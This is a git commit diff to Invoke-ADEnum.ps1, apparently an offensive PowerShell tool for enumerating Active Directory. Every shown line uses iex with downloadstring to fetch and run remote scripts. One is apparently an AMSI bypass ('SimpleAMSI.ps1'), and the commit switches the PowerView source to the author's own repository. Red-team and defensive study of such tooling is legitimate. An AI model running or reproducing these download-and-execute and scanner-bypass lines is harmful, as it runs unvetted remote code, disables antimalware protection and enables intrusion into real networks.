21b635b55878071b05548d8770ea95aad0e3c9aa
Rob <61951374+Leo4j@users.noreply.github.com>
2023-04-18 12:36:29 +0100

    Update Invoke-ADEnum.ps1

--- Invoke-ADEnum.ps1
+++ Invoke-ADEnum.ps1
@@ -1,6 +1,6 @@
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView.ps1')
 
 function Invoke-ADEnum
 {
